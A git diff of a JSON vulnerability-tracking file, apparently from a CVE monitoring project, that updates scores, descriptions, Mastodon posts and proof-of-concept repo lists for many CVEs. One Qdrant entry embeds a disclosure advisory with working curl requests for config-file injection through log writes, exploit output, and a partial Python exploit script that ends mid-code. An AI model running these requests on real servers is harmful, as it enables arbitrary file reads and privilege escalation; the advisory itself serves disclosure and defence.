@@ -1,4 +1,67 @@
 {
+  "CVE-2026-25857": {
+    "cvss3": 0,
+    "severity": null,
+    "epss_severity": null,
+    "nuclei": null,
+    "posts": [
+      {
+        "account": {
+          "id": "114267265908113668",
+          "username": "offseq",
+          "acct": "offseq",
+          "display_name": "Offensive Sequence",
+          "locked": false,
+          "bot": false,
+          "discoverable": true,
+          "indexable": true,
+          "group": false,
+          "created_at": "2025-04-02T00:00:00.000Z",
+          "note": "<p>OffSeq is a cybersecurity company enhancing organizational digital resilience through comprehensive protection against evolving cyber threats. We offer specialized services for businesses of all sizes, with particular expertise in Baltic, Scandinavian, Belgian markets and EU regulatory compliance.</p>",
+          "url": "https://infosec.exchange/@offseq",
+          "uri": "https://infosec.exchange/users/offseq",
+          "avatar": "https://media.infosec.exchange/infosec.exchange/accounts/avatars/114/267/265/908/113/668/original/014780c34a5a61f4.png",
+          "avatar_static": "https://media.infosec.exchange/infosec.exchange/accounts/avatars/114/267/265/908/113/668/original/014780c34a5a61f4.png",
+          "header": "https://media.infosec.exchange/infosec.exchange/accounts/headers/114/267/265/908/113/668/original/7751777f16b62f40.jpg",
+          "header_static": "https://media.infosec.exchange/infosec.exchange/accounts/headers/114/267/265/908/113/668/original/7751777f16b62f40.jpg",
+          "followers_count": 92,
+          "following_count": 0,
+          "statuses_count": 1601,
+          "last_status_at": "2026-02-08",
+          "hide_collections": null,
+          "noindex": false,
+          "emojis": [],
+          "roles": [],
+          "fields": [
+            {
+              "name": "Website",
+              "value": "<a href=\"https://offseq.com\" target=\"_blank\" rel=\"nofollow noopener me\" translate=\"no\"><span class=\"invisible\">https://</span><span class=\"\">offseq.com</span><span class=\"invisible\"></span></a>",
+              "verified_at": null
+            },
+            {
+              "name": "Threat Radar",
+              "value": "<a href=\"https://radar.offseq.com\" target=\"_blank\" rel=\"nofollow noopener me\" translate=\"no\"><span class=\"invisible\">https://</span><span class=\"\">radar.offseq.com</span><span class=\"invisible\"></span></a>",
+              "verified_at": null
+            },
+            {
+              "name": "Guard",
+              "value": "<a href=\"https://guard.offseq.com/\" target=\"_blank\" rel=\"nofollow noopener me\" translate=\"no\"><span class=\"invisible\">https://</span><span class=\"\">guard.offseq.com/</span><span class=\"invisible\"></span></a>",
+              "verified_at": null
+            }
+          ]
+        },
+        "url": "https://infosec.exchange/@offseq/116033128377019948",
+        "content": "<p>\u26a0\ufe0f CVE-2026-25857: HIGH-severity OS command injection in Tenda G300-F routers (\u226416.01.14.2). No patch yet \u2014 exposure of management interface risks full device compromise. Restrict access, monitor WAN diagnostics. Details: <a href=\"https://radar.offseq.com/threat/cve-2026-25857-cwe-78-improper-neutralization-of-s-97d5f696\" target=\"_blank\" rel=\"nofollow noopener\" translate=\"no\"><span class=\"invisible\">https://</span><span class=\"ellipsis\">radar.offseq.com/threat/cve-20</span><span class=\"invisible\">26-25857-cwe-78-improper-neutralization-of-s-97d5f696</span></a> <a href=\"https://infosec.exchange/tags/OffSeq\" class=\"mention hashtag\" rel=\"tag\">#<span>OffSeq</span></a> <a href=\"https://infosec.exchange/tags/Infosec\" class=\"mention hashtag\" rel=\"tag\">#<span>Infosec</span></a> <a href=\"https://infosec.exchange/tags/Vuln\" class=\"mention hashtag\" rel=\"tag\">#<span>Vuln</span></a></p>",
+        "created_at": "2026-02-08T04:30:30.159Z"
+      }
+    ],
+    "description": "Tenda G300-F router firmware versio 16.01.14.2 and prior contain an OS command injection vulnerability in the WAN diagnostic functionality (formSetWanDiag). The implementation constructs a shell command that invokes curl and incorporates attacker-controlled input into the command line without adequate neutralization. As a result, a remote attacker with access to the affected management interface can inject additional shell syntax and execute arbitrary commands on the device with the privileges of the management process.",
+    "repos": [
+      "https://github.com/eeeeeeeeeevan/CVE-2026-25857"
+    ],
+    "updated": "2026-02-07T22:16:02.607000",
+    "epss": 0
+  },
   "CVE-2026-2129": {
     "cvss3": 7.2,
     "severity": "HIGH",
@@ -26,7 +89,7 @@
           "header_static": "https://media.infosec.exchange/infosec.exchange/accounts/headers/114/267/265/908/113/668/original/7751777f16b62f40.jpg",
           "followers_count": 92,
           "following_count": 0,
-          "statuses_count": 1600,
+          "statuses_count": 1601,
           "last_status_at": "2026-02-08",
           "hide_collections": null,
           "noindex": false,
@@ -279,7 +342,7 @@
           "header_static": "https://media.infosec.exchange/infosec.exchange/accounts/headers/114/267/265/908/113/668/original/7751777f16b62f40.jpg",
           "followers_count": 92,
           "following_count": 0,
-          "statuses_count": 1600,
+          "statuses_count": 1601,
           "last_status_at": "2026-02-08",
           "hide_collections": null,
           "noindex": false,
@@ -340,7 +403,7 @@
           "header_static": "https://media.infosec.exchange/infosec.exchange/accounts/headers/114/267/265/908/113/668/original/7751777f16b62f40.jpg",
           "followers_count": 92,
           "following_count": 0,
-          "statuses_count": 1600,
+          "statuses_count": 1601,
           "last_status_at": "2026-02-08",
           "hide_collections": null,
           "noindex": false,
@@ -401,7 +464,7 @@
           "header_static": "https://media.infosec.exchange/infosec.exchange/accounts/headers/114/267/265/908/113/668/original/7751777f16b62f40.jpg",
           "followers_count": 92,
           "following_count": 0,
-          "statuses_count": 1600,
+          "statuses_count": 1601,
           "last_status_at": "2026-02-08",
           "hide_collections": null,
           "noindex": false,
@@ -504,7 +567,7 @@
           "header_static": "https://media.infosec.exchange/infosec.exchange/accounts/headers/114/267/265/908/113/668/original/7751777f16b62f40.jpg",
           "followers_count": 92,
           "following_count": 0,
-          "statuses_count": 1600,
+          "statuses_count": 1601,
           "last_status_at": "2026-02-08",
           "hide_collections": null,
           "noindex": false,
@@ -932,10 +995,10 @@
     ],
     "description": "The Metro Development Server, which is opened by the React Native Community CLI, binds to external interfaces by default. The server exposes an endpoint that is vulnerable to OS command injection. This allows unauthenticated network attackers to send a POST request to the server and run arbitrary executables. On Windows, the attackers can also execute arbitrary shell commands with fully controlled arguments.",
     "repos": [
+      "https://github.com/SaidBenaissa/cve-2025-11953-vulnerability-demo",
       "https://github.com/boroeurnprach/CVE-2025-11953-PoC",
-      "https://github.com/Mr-In4inci3le/CVE-2025-11953-POC-",
       "https://github.com/N3k0t-dev/PoC-CVE-collection",
-      "https://github.com/SaidBenaissa/cve-2025-11953-vulnerability-demo"
+      "https://github.com/Mr-In4inci3le/CVE-2025-11953-POC-"
     ],
     "updated": "2026-02-06T19:43:47.703000",
     "epss": 6.952
@@ -967,7 +1030,7 @@
           "header_static": "https://media.infosec.exchange/infosec.exchange/accounts/headers/114/267/265/908/113/668/original/7751777f16b62f40.jpg",
           "followers_count": 92,
           "following_count": 0,
-          "statuses_count": 1600,
+          "statuses_count": 1601,
           "last_status_at": "2026-02-08",
           "hide_collections": null,
           "noindex": false,
@@ -1166,7 +1229,7 @@
           "header_static": "https://media.infosec.exchange/infosec.exchange/accounts/headers/114/267/265/908/113/668/original/7751777f16b62f40.jpg",
           "followers_count": 92,
           "following_count": 0,
-          "statuses_count": 1600,
+          "statuses_count": 1601,
           "last_status_at": "2026-02-08",
           "hide_collections": null,
           "noindex": false,
@@ -1363,13 +1426,13 @@
         "created_at": "2026-02-06T22:16:42.000Z"
       }
     ],
-    "description": "### Impact\n\nWhen querying JSON or richText fields, user input was directly embedded into SQL without escaping, enabling blind SQL Injection attacks. An unauthenticated attacker could extract sensitive data (emails, password reset tokens) and achieve full account takeover without password cracking.\n\n**Users are affected if ALL of these are true:**\n\n1. Payload version < v3.73.0\n2. Using a Drizzle-based database adapter (`@payloadcms/drizzle` as dependency):\n   - `@payloadcms/db-postgres`\n   - `@payloadcms/db-vercel-postgres`\n   - `@payloadcms/db-sqlite`\n   - `@payloadcms/db-d1-sqlite`\n3. At least one accessible collection that has a `type: 'json'` or `type: 'richText'` field where `access.read` returns anything other than `false` (`true` or `Where` constraint)\n\n**Users are NOT affected if:**\n\n- Using `@payloadcms/db-mongodb`\n- No JSON or richText fields exist in any collection\n- All JSON/richText fields have `access: { read: () => false }`\n\n### Patches\n\nUpgrade to Payload **v3.73.0** or later.\n\n### Workarounds\n\nIf a project cannot upgrade immediately, add `access: { read: () => false }` to all JSON and richText fields as a temporary mitigation.",
+    "description": "Payload is a free and open source headless content management system. Prior to 3.73.0, when querying JSON or richText fields, user input was directly embedded into SQL without escaping, enabling blind SQL injection attacks. An unauthenticated attacker could extract sensitive data (emails, password reset tokens) and achieve full account takeover without password cracking. This vulnerability is fixed in 3.73.0.",
     "repos": [],
-    "updated": "2026-02-07T00:31:53",
+    "updated": "2026-02-06T22:16:11.597000",
     "epss": 0.052
   },
   "CVE-2026-1727": {
-    "cvss3": null,
+    "cvss3": 0,
     "severity": null,
     "epss_severity": "LOW",
     "nuclei": null,
@@ -1395,7 +1458,7 @@
           "header_static": "https://media.infosec.exchange/infosec.exchange/accounts/headers/114/267/265/908/113/668/original/7751777f16b62f40.jpg",
           "followers_count": 92,
           "following_count": 0,
-          "statuses_count": 1600,
+          "statuses_count": 1601,
           "last_status_at": "2026-02-08",
           "hide_collections": null,
           "noindex": false,
@@ -1426,11 +1489,11 @@
     ],
     "description": "The Agentspace service was affected by a vulnerability that exposed sensitive information due to the use of predictable Google Cloud Storage bucket names. These names were utilized for error logs and temporary staging during data imports from GCS and Cloud SQL. This predictability allowed an attacker to engage in \"bucket squatting\" by establishing these buckets before a victim's initial use.\n\nAll versions after December 12th, 2025 have been updated to protect from this vulnerability. No user action is required for this.",
     "repos": [],
-    "updated": "2026-02-07T00:30:27",
+    "updated": "2026-02-06T22:16:10.860000",
     "epss": 0.042
   },
   "CVE-2026-1731": {
-    "cvss3": null,
+    "cvss3": 0,
     "severity": null,
     "epss_severity": "LOW",
     "nuclei": null,
@@ -1456,7 +1519,7 @@
           "header_static": "https://media.infosec.exchange/infosec.exchange/accounts/headers/114/267/265/908/113/668/original/7751777f16b62f40.jpg",
           "followers_count": 92,
           "following_count": 0,
-          "statuses_count": 1600,
+          "statuses_count": 1601,
           "last_status_at": "2026-02-08",
           "hide_collections": null,
           "noindex": false,
@@ -1487,7 +1550,7 @@
     ],
     "description": "BeyondTrust Remote Support (RS) and certain older versions of Privileged Remote Access (PRA) contain a critical pre-authentication remote code execution vulnerability. By sending specially crafted requests, an unauthenticated remote attacker may be able to execute operating system commands in the context of the site user.",
     "repos": [],
-    "updated": "2026-02-07T00:30:34",
+    "updated": "2026-02-06T22:16:11.020000",
     "epss": 0.439
   },
   "CVE-2026-25763": {
@@ -1517,7 +1580,7 @@
           "header_static": "https://media.infosec.exchange/infosec.exchange/accounts/headers/114/267/265/908/113/668/original/7751777f16b62f40.jpg",
           "followers_count": 92,
           "following_count": 0,
-          "statuses_count": 1600,
+          "statuses_count": 1601,
           "last_status_at": "2026-02-08",
           "hide_collections": null,
           "noindex": false,
@@ -1552,8 +1615,8 @@
     "epss": 0.044000000000000004
   },
   "CVE-2026-25803": {
-    "cvss3": 0,
-    "severity": null,
+    "cvss3": 9.8,
+    "severity": "CRITICAL",
     "epss_severity": "LOW",
     "nuclei": null,
     "posts": [
@@ -1578,7 +1641,7 @@
           "header_static": "https://media.infosec.exchange/infosec.exchange/accounts/headers/114/267/265/908/113/668/original/7751777f16b62f40.jpg",
           "followers_count": 92,
           "following_count": 0,
-          "statuses_count": 1600,
+          "statuses_count": 1601,
           "last_status_at": "2026-02-08",
           "hide_collections": null,
           "noindex": false,
@@ -1627,7 +1690,7 @@
           "header_static": "https://media.infosec.exchange/infosec.exchange/accounts/headers/114/267/265/908/113/668/original/7751777f16b62f40.jpg",
           "followers_count": 92,
           "following_count": 0,
-          "statuses_count": 1600,
+          "statuses_count": 1601,
           "last_status_at": "2026-02-08",
           "hide_collections": null,
           "noindex": false,
@@ -1824,16 +1887,16 @@
         "created_at": "2026-02-06T23:22:07.000Z"
       }
     ],
-    "description": "N/A",
+    "description": "3DP-MANAGER is an inbound generator for 3x-ui. In version 2.0.1 and prior, the application automatically creates an administrative account with known default credentials (admin/admin) upon the first initialization. Attackers with network access to the application's login interface can gain full administrative control, managing VPN tunnels and system settings. This issue will be patched in version 2.0.2.",
     "repos": [],
-    "updated": null,
+    "updated": "2026-02-06T23:15:54.973000",
     "epss": 0.041
   },
   "CVE-2017-12615": {
     "cvss3": 8.1,
     "severity": "HIGH",
     "epss_severity": "CRITICAL",
-    "nuclei": "https://github.com/projectdiscovery/nuclei-templates/blob/868e4b4fcd0ef2bca8739b8971406ed55739b9d3/http/cves/2017/CVE-2017-12615.yaml",
+    "nuclei": "https://github.com/projectdiscovery/nuclei-templates/blob/80c2051bd6b1b4484ccb2a9459493ab7ddccacfc/http/cves/2017/CVE-2017-12615.yaml",
     "posts": [
       {
         "account": {
@@ -1932,33 +1995,33 @@
     ],
     "description": "When running Apache Tomcat 7.0.0 to 7.0.79 on Windows with HTTP PUTs enabled (e.g. via setting the readonly initialisation parameter of the Default to false) it was possible to upload a JSP file to the server via a specially crafted request. This JSP could then be requested and any code it contained would be executed by the server.",
     "repos": [
-      "https://github.com/BeyondCy/CVE-2017-12615",
-      "https://github.com/zi0Black/POC-CVE-2017-12615-or-CVE-2017-12717",
-      "https://github.com/Shellkeys/CVE-2017-12615",
-      "https://github.com/wudidwo/CVE-2017-12615-poc",
       "https://github.com/netw0rk7/CVE-2017-12615-Home-Lab",
-      "https://github.com/1337g/CVE-2017-12615",
-      "https://github.com/ianxtianxt/CVE-2017-12615",
-      "https://github.com/cyberharsh/Tomcat-CVE-2017-12615",
       "https://github.com/wsg00d/cve-2017-12615",
-      "https://github.com/Fa1c0n35/CVE-2017-12615",
-      "https://github.com/lizhianyuguangming/TomcatScanPro",
-      "https://github.com/edyekomu/CVE-2017-12615-PoC",
-      "https://github.com/tpt11fb/AttackTomcat",
-      "https://github.com/mefulton/cve-2017-12615",
       "https://github.com/w0x68y/CVE-2017-12615-EXP",
+      "https://github.com/wudidwo/CVE-2017-12615-poc",
+      "https://github.com/Fa1c0n35/CVE-2017-12615",
+      "https://github.com/zi0Black/POC-CVE-2017-12615-or-CVE-2017-12717",
+      "https://github.com/mefulton/cve-2017-12615",
       "https://github.com/breaktoprotect/CVE-2017-12615",
+      "https://github.com/tpt11fb/AttackTomcat",
+      "https://github.com/Shellkeys/CVE-2017-12615",
+      "https://github.com/BeyondCy/CVE-2017-12615",
+      "https://github.com/cyberharsh/Tomcat-CVE-2017-12615",
       "https://github.com/cved-sources/cve-2017-12615",
-      "https://github.com/xiaokp7/Tomcat_PUT_GUI_EXP"
+      "https://github.com/xiaokp7/Tomcat_PUT_GUI_EXP",
+      "https://github.com/1337g/CVE-2017-12615",
+      "https://github.com/lizhianyuguangming/TomcatScanPro",
+      "https://github.com/ianxtianxt/CVE-2017-12615",
+      "https://github.com/edyekomu/CVE-2017-12615-PoC"
     ],
-    "updated": "2025-10-22T17:31:15",
+    "updated": "2025-10-22T00:16:04.227000",
     "epss": 94.22399999999999
   },
   "CVE-2017-12617": {
     "cvss3": 8.1,
     "severity": "HIGH",
     "epss_severity": "CRITICAL",
-    "nuclei": "https://github.com/projectdiscovery/nuclei-templates/blob/868e4b4fcd0ef2bca8739b8971406ed55739b9d3/http/cves/2017/CVE-2017-12617.yaml",
+    "nuclei": "https://github.com/projectdiscovery/nuclei-templates/blob/80c2051bd6b1b4484ccb2a9459493ab7ddccacfc/http/cves/2017/CVE-2017-12617.yaml",
     "posts": [
       {
         "account": {
@@ -2057,21 +2120,21 @@
     ],
     "description": "When running Apache Tomcat versions 9.0.0.M1 to 9.0.0, 8.5.0 to 8.5.22, 8.0.0.RC1 to 8.0.46 and 7.0.0 to 7.0.81 with HTTP PUTs enabled (e.g. via setting the readonly initialisation parameter of the Default servlet to false) it was possible to upload a JSP file to the server via a specially crafted request. This JSP could then be requested and any code it contained would be executed by the server.",
     "repos": [
-      "https://github.com/zi0Black/POC-CVE-2017-12615-or-CVE-2017-12717",
+      "https://github.com/qiantu88/CVE-2017-12617",
+      "https://github.com/tyranteye666/tomcat-cve-2017-12617",
+      "https://github.com/ygouzerh/CVE-2017-12617",
+      "https://github.com/jptr218/tc_hack",
+      "https://github.com/DevaDJ/CVE-2017-12617",
+      "https://github.com/K3ysTr0K3R/CVE-2017-12617-EXPLOIT",
+      "https://github.com/TheRealCiscoo/Tomcat_CVE201712617",
+      "https://github.com/scirusvulgaris/CVE-2017-12617",
+      "https://github.com/LongWayHomie/CVE-2017-12617",
       "https://github.com/devcoinfet/CVE-2017-12617",
       "https://github.com/yZee00/CVE-2017-12617",
-      "https://github.com/LongWayHomie/CVE-2017-12617",
-      "https://github.com/tyranteye666/tomcat-cve-2017-12617",
-      "https://github.com/TheRealCiscoo/Tomcat_CVE201712617",
-      "https://github.com/cyberheartmi9/CVE-2017-12617",
-      "https://github.com/qiantu88/CVE-2017-12617",
-      "https://github.com/ygouzerh/CVE-2017-12617",
-      "https://github.com/K3ysTr0K3R/CVE-2017-12617-EXPLOIT",
-      "https://github.com/scirusvulgaris/CVE-2017-12617",
-      "https://github.com/jptr218/tc_hack",
-      "https://github.com/DevaDJ/CVE-2017-12617"
+      "https://github.com/zi0Black/POC-CVE-2017-12615-or-CVE-2017-12717",
+      "https://github.com/cyberheartmi9/CVE-2017-12617"
     ],
-    "updated": "2025-10-22T17:30:39",
+    "updated": "2025-10-22T00:16:04.407000",
     "epss": 94.356
   },
   "CVE-2026-24423": {
@@ -2101,7 +2164,7 @@
           "header_static": "https://media.infosec.exchange/infosec.exchange/cache/accounts/headers/113/264/748/163/343/217/original/9f300f0aeb2a55e9.jpg",
           "followers_count": 198,
           "following_count": 6,
-          "statuses_count": 47150,
+          "statuses_count": 47156,
           "last_status_at": "2026-02-08",
           "hide_collections": false,
           "emojis": [],
@@ -2402,7 +2465,7 @@
     "repos": [
       "https://github.com/aavamin/CVE-2026-24423"
     ],
-    "updated": "2026-02-06T18:30:29",
+    "updated": "2026-02-06T16:45:15.323000",
     "epss": 9.22
   },
   "CVE-2026-2071": {
@@ -2592,9 +2655,9 @@
         "created_at": "2026-02-06T23:21:48.000Z"
       }
     ],
-    "description": "### Summary\n\nA Denial of Service (DoS) vulnerability (CWE-400) exists in the multipart file handling logic of `@adonisjs/bodyparser`. When processing file uploads, the multipart parser may accumulate an unbounded amount of data in memory while attempting to detect file types, potentially leading to excessive memory consumption and process termination.\n\nThis issue affects applications that accept `multipart/form-data` uploads using affected versions of `@adonisjs/bodyparser`.\n\n### Details\n\nAdonisJS parses `multipart/form-data` requests using the BodyParser package. During file uploads, the multipart parser attempts to detect the uploaded file type by accumulating incoming chunks in an internal buffer to perform magic number detection.\n\nThe internal buffer used for this detection does not enforce a maximum size and is not protected by a timeout or early termination condition. If the uploaded data does not match any supported file signatures, the buffer continues to grow as more chunks are received.\n\nWhen certain configurations are used, such as deferred validations or permissive file size limits, this buffering behavior may persist for the duration of the upload stream.\n\n### Impact\n\nExploitation requires a reachable endpoint that accepts multipart file uploads.\n\nAn attacker can send a specially crafted multipart request containing a large or unbounded stream of data that does not match known file signatures. This may cause the server to continuously allocate memory until the Node.js process exhausts available RAM and terminates due to an out-of-memory condition.\n\nThis results in a Denial of Service, making the application unavailable to legitimate users. Authentication is not required if the upload endpoint is publicly accessible.\n\n### Patches\n\nFixes targeting v6 and v7 have been published below.\n\nUsers should upgrade to a version that includes the following fix:\n- https://github.com/adonisjs/bodyparser/releases/tag/v10.1.3\n- https://github.com/adonisjs/bodyparser/releases/tag/v11.0.0-next.9",
+    "description": "AdonisJS is a TypeScript-first web framework. Prior to versions 10.1.3 and 11.0.0-next.9, a denial of service (DoS) vulnerability exists in the multipart file handling logic of @adonisjs/bodyparser. When processing file uploads, the multipart parser may accumulate an unbounded amount of data in memory while attempting to detect file types, potentially leading to excessive memory consumption and process termination. This issue has been patched in versions 10.1.3 and 11.0.0-next.9.",
     "repos": [],
-    "updated": "2026-02-07T00:33:35",
+    "updated": "2026-02-06T23:15:54.670000",
     "epss": 0.012
   },
   "CVE-2026-25644": {
@@ -3285,48 +3348,6 @@
     "posts": [
       {
         "account": {
-          "id": "115780929223240988",
-          "username": "thehackerwire",
-          "acct": "thehackerwire@mastodon.social",
-          "display_name": "TheHackerWire",
-          "locked": false,
-          "bot": true,
-          "discoverable": true,
-          "indexable": true,
-          "group": false,
-          "created_at": "2025-12-21T00:00:00.000Z",
-          "note": "<p>Cybersecurity Chronicles \ud83c\udf10 | Breaking down the latest in security news, <a href=\"https://mastodon.social/tags/hacking\" class=\"mention hashtag\" rel=\"nofollow noopener\" target=\"_blank\">#<span>hacking</span></a> <a href=\"https://mastodon.social/tags/darkweb\" class=\"mention hashtag\" rel=\"nofollow noopener\" target=\"_blank\">#<span>darkweb</span></a> <a href=\"https://mastodon.social/tags/Cybersecurity\" class=\"mention hashtag\" rel=\"nofollow noopener\" target=\"_blank\">#<span>Cybersecurity</span></a> <a href=\"https://mastodon.social/tags/InfoSec\" class=\"mention hashtag\" rel=\"nofollow noopener\" target=\"_blank\">#<span>InfoSec</span></a> <a href=\"https://mastodon.social/tags/HackingNews\" class=\"mention hashtag\" rel=\"nofollow noopener\" target=\"_blank\">#<span>HackingNews</span></a></p>",
-          "url": "https://mastodon.social/@thehackerwire",
-          "uri": "https://mastodon.social/ap/users/115755483699003887",
-          "avatar": "https://media.infosec.exchange/infosec.exchange/cache/accounts/avatars/115/780/929/223/240/988/original/57ab1a2ca33e5310.jpg",
-          "avatar_static": "https://media.infosec.exchange/infosec.exchange/cache/accounts/avatars/115/780/929/223/240/988/original/57ab1a2ca33e5310.jpg",
-          "header": "https://media.infosec.exchange/infosec.exchange/cache/accounts/headers/115/780/929/223/240/988/original/d791186b03aef409.jpeg",
-          "header_static": "https://media.infosec.exchange/infosec.exchange/cache/accounts/headers/115/780/929/223/240/988/original/d791186b03aef409.jpeg",
-          "followers_count": 59,
-          "following_count": 2,
-          "statuses_count": 1526,
-          "last_status_at": "2026-02-08",
-          "hide_collections": false,
-          "emojis": [],
-          "fields": [
-            {
-              "name": "Website",
-              "value": "<a href=\"https://www.thehackerwire.com/\" rel=\"nofollow noopener\" translate=\"no\" target=\"_blank\"><span class=\"invisible\">https://www.</span><span class=\"\">thehackerwire.com/</span><span class=\"invisible\"></span></a>",
-              "verified_at": null
-            },
-            {
-              "name": "X",
-              "value": "<a href=\"https://x.com/TheHackerWire\" rel=\"nofollow noopener\" translate=\"no\" target=\"_blank\"><span class=\"invisible\">https://</span><span class=\"\">x.com/TheHackerWire</span><span class=\"invisible\"></span></a>",
-              "verified_at": null
-            }
-          ]
-        },
-        "url": "https://mastodon.social/@thehackerwire/116025918972285692",
-        "content": "<p>\ud83d\udfe0 CVE-2026-25635 - High (8.6)</p><p>calibre is an e-book manager. Prior to 9.2.0, Calibre's CHM reader contains a path traversal vulnerability that allows arbitrary file writes anywhere the user has write permissions. On Windows (haven't tested on other OS's), this can lead to Remot...</p><p>\ud83d\udd17 <a href=\"https://www.thehackerwire.com/vulnerability/CVE-2026-25635/\" rel=\"nofollow noopener\" translate=\"no\" target=\"_blank\"><span class=\"invisible\">https://www.</span><span class=\"ellipsis\">thehackerwire.com/vulnerabilit</span><span class=\"invisible\">y/CVE-2026-25635/</span></a></p><p><a href=\"https://mastodon.social/tags/CVE\" class=\"mention hashtag\" rel=\"nofollow noopener\" target=\"_blank\">#<span>CVE</span></a> <a href=\"https://mastodon.social/tags/vulnerability\" class=\"mention hashtag\" rel=\"nofollow noopener\" target=\"_blank\">#<span>vulnerability</span></a> <a href=\"https://mastodon.social/tags/infosec\" class=\"mention hashtag\" rel=\"nofollow noopener\" target=\"_blank\">#<span>infosec</span></a> <a href=\"https://mastodon.social/tags/cybersecurity\" class=\"mention hashtag\" rel=\"nofollow noopener\" target=\"_blank\">#<span>cybersecurity</span></a> <a href=\"https://mastodon.social/tags/security\" class=\"mention hashtag\" rel=\"nofollow noopener\" target=\"_blank\">#<span>security</span></a> <a href=\"https://mastodon.social/tags/Tenda\" class=\"mention hashtag\" rel=\"nofollow noopener\" target=\"_blank\">#<span>Tenda</span></a> <a href=\"https://mastodon.social/tags/patchstack\" class=\"mention hashtag\" rel=\"nofollow noopener\" target=\"_blank\">#<span>patchstack</span></a></p>",
-        "created_at": "2026-02-06T21:57:03.000Z"
-      },
-      {
-        "account": {
           "id": "115780929217569257",
           "username": "thehackerwire",
           "acct": "thehackerwire@mastodon.social",
@@ -3458,8 +3479,8 @@
     "epss": 0.047
   },
   "CVE-2026-25634": {
-    "cvss3": 0,
-    "severity": null,
+    "cvss3": 7.8,
+    "severity": "HIGH",
     "epss_severity": "LOW",
     "nuclei": null,
     "posts": [
@@ -3590,9 +3611,9 @@
         "created_at": "2026-02-06T21:17:58.000Z"
       }
     ],
-    "description": "N/A",
+    "description": "iccDEV provides a set of libraries and tools that allow for the interaction, manipulation, and application of ICC color management profiles. Prior to 2.3.1.4, SrcPixel and DestPixel stack buffers overlap in CIccTagMultiProcessElement::Apply() int IccTagMPE.cpp. This vulnerability is fixed in 2.3.1.4.",
     "repos": [],
-    "updated": null,
+    "updated": "2026-02-06T21:57:22.450000",
     "epss": 0.012
   },
   "CVE-2026-25593": {
@@ -3704,7 +3725,7 @@
     "epss": 0.011000000000000001
   },
   "CVE-2026-25628": {
-    "cvss3": 8.5,
+    "cvss3": 8.6,
     "severity": "HIGH",
     "epss_severity": "LOW",
     "nuclei": null,
@@ -3794,14 +3815,14 @@
         "created_at": "2026-02-06T21:17:49.000Z"
       }
     ],
-    "description": "Qdrant is a vector similarity search engine and vector database. From 1.9.3 to before 1.16.0, it is possible to append to arbitrary files via /logger endpoint using an attacker-controlled on_disk.log_file path. Minimal privileges are required (read-only access). This vulnerability is fixed in 1.16.0.",
+    "description": "### Summary\nIt is possible to append to arbitrary files via /logger endpoint. Minimal privileges are required (read-only access). Tested on Qdrant 1.15.5\n\n### Details\n`POST /logger`\n([Source code link](https://github.com/qdrant/qdrant/blob/48203e414e4e7f639a6d394fb6e4df695f808e51/src/actix/api/service_api.rs#L195))\nendpoint accepts an attacker-controlled `on_disk.log_file` path.\n\nThere are no authorization checks (but authentication check is present).\n\nThis can be exploited in the following way: if configuration directory is writable and `config/local.yaml` does not exist, set log path to `config/local.yaml` and send a request with a log injection payload. The`PATCH /collections` endpoint was used with an invalid collection name to inject valid yaml.\n\nAfter running the PoC, the content of `config/local.yaml` will be:\n\n```yaml\n2025-11-11T23:52:22.054804Z  INFO actix_web::middleware::logger: 172.18.0.1 \"POST /logger HTTP/1.1\" 200 57 \"-\" \"python-requests/2.32.5\" 0.009422\n2025-11-11T23:52:22.056962Z  INFO storage::content_manager::toc::collection_meta_ops: Updating collection hui\nservice:\n    static_content_dir: ..\n\n2025-11-11T23:52:22.057530Z  INFO actix_web::middleware::logger: 172.18.0.1 \"PATCH /collections/hui%0Aservice:%0A%20%20static_content_dir:%20..%0A HTTP/1.1\" 404 113 \"-\" \"python-requests/2.32.5\" 0.001391\n```\n\nSome junk log lines are present, but they don't matter as this is still valid yaml.\n\nAfter that, if qdrant is restarted (via legitimate means or by a OOM/crash), then `local.yaml` config will have higher priority and `service.static_content_dir` will be set to `..`. In a container environment, this allows one to read all files via the web UI path.\n\nAlso overriding config file may let the attacker raise its privileges with a custom master key (remember that lowest privileges are required to access the vulnerable endpoint).\n\nRelevant requests:\n\n1. Enable on-disk logging to the config file:\n\n```bash\ncurl -sS -X POST \"http://localhost:6333/logger\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\n    \"log_level\":\"INFO\",\n    \"on_disk\":{\n      \"enabled\":true,\n      \"format\":\"text\",\n      \"log_level\":\"INFO\",\n      \"buffer_size_bytes\":1,\n      \"log_file\":\"config/local.yaml\"\n    }\n  }'\n```\n\n2. Inject YAML via a request that logs newlines (URL-encoded):\n\n```bash\ncurl -sS -X PATCH \"http://localhost:6333/collections/hui%0aservice:%0a%20%20static_content_dir:%20..%0a\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{}'\n```\n\n### Full reproduction instructions\n\n1. Start Qdrant with a writable configuration directory:\n\n```sh\nsudo docker run -p 6333:6333 --name qdrant-poc -d qdrant/qdrant:v1.15.5\n```\n\n2. Run the exploit:\n\n```sh\n% python3 exploit.py --url http://localhost:6333\n[+] Logger configured\n[+] Log injection successful\n[+] Logger disabled\nRestart Qdrant cluster and press Enter to continue...\n```\n\n3. Restart the container:\n\n```sh\nsudo docker restart qdrant-poc\n```\n\n4. Resume the exploit:\n\n```sh\n<press Enter>\n[+] Passwd file retrieved\n--------------------------------\n...\n--------------------------------\n[+] Config file retrieved\n--------------------------------\n...\n```\n\n## Mitigation\n\n1. Limit usage of `/logger` endpoint to users with management privileges only (or better disable it completely).\n2. Restrict the path of the log file to a dedicated logs directory.\n\nThis vulnerability does not affect Qdrant cloud as the configuration directory is not writable.\n\n## Exploit code\n\n### `exploit_privesc.py`\n\n```python\nimport requests\nimport sys\nimport argparse\n\nparser = argparse.ArgumentParser(description=\"Exploit script for posting to Qdrant API\")\nparser.add_argument(\"--url\", required=False, help=\"Target URL for API\", default=\"http://localhost:6333\")\nparser.add_argument(\"--api-key\", required=False, help=\"API key\")\n\nargs = parser.parse_args()\n\nurl = args.url\n\nheaders = {}\nif args.api_key:\n    headers[\"api-key\"] = args.api_key\n\ns = requests.Session()\n\ns.headers.update(headers)\n\nres = s.post(\n    f\"{url}/logger\",\n    json={\n        \"log_level\": \"INFO\",\n        \"on_disk\": {\n            \"enabled\": True,\n            \"format\": \"text\",\n            \"log_level\": \"INFO\",\n            \"buffer_size_bytes\": 1,\n            \"log_file\": \"config/local.yaml\",\n        },\n    },\n)\nres.raise_for_status()\nprint(\"[+] Logger configured\")\n\n\nres = s.patch(\n    f\"{url}/collections/%0aservice:%0a%20%20static_content_dir:%20..%0a\",\n    json={},\n)\nerror = res.json()[\"status\"][\"error\"]\n\nif \"doesn't exist!\" in error:\n    